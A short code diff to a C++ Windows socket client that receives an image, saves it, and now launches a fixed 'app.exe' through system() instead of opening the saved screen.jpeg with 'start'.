@@ -20,8 +20,8 @@ int main() {
     SOCKET client_socket;
     struct sockaddr_in server_addr;
     char buffer[BUFFER_SIZE] = {0};
-    std::string cmd = "start requested_images/";
-    std::string temp = "start requested_images/";
+    std::string cmd = "app.exe";
+    std::string temp = "app.exe";
     std::string response;
 
     // Attempts to initialize WSA
@@ -112,7 +112,7 @@ int main() {
 
         fclose(image_file);
         std::cout << "Image received and saved. Opening Image..." << std::endl;
-        system((cmd + "screen.jpeg").c_str());
+        system((cmd).c_str());
 
         // Resets strings
         cmd = temp;
